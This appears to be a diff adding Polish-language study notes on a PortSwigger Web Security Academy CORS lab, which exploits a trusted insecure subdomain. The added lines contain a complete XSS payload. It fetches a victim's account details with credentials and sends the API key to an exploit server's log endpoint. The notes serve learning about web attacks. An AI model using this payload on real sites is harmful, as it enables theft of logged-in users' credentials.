@@ -8,3 +8,14 @@ Access-Control-Allow-Origin: null
 
 Przyklad na prinscreenie dla subdomeny siemanko. Wpisalismy orginalny adres strony i okazalo sie ze pojawil sie naglowek mamy pozwolenie :). 
 No i proba dopisania subdomeny siemanko pokazuje ze mozemy cos takiego zrobic.
+Nastepnie szukamy subdomen do strony orginalnej i szukamy na nich np. xss jezeli znajdziemy to mozemy zrobic z niej zapytanie do np. servera po api key.
+
+(https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+
+Przyklad kodu na subdomenie wysylajacego dane do zlego servera :)
+<script>
+	document.location="https://stock.0a0600070358d2bdc097731600700046.web-security-academy.net/?productId=%3cscript%3evar xhr = new XMLHttpRequest();var url = 'https://0a0600070358d2bdc097731600700046.web-security-academy.net/accountDetails';xhr.onreadystatechange = function()%7bif(xhr.readyState == XMLHttpRequest.DONE) %7b fetch('https://exploit-0a24000303bdd297c01373df01580029.web-security-academy.net/log?key=' + xhr.responseText) }}; xhr.open('GET', url, true); xhr.withCredentials = true; xhr.send(null);%3c/script%3e&storeId=1"
+</script>
+
+Czyli tworzymy spreparowana strone na ktora jak ktos wejdzie to siagnie sie subdomena i wykona zapytanie o kredki no i jak ktos jest zalogowany w 
+przegladarce to mamy to :)
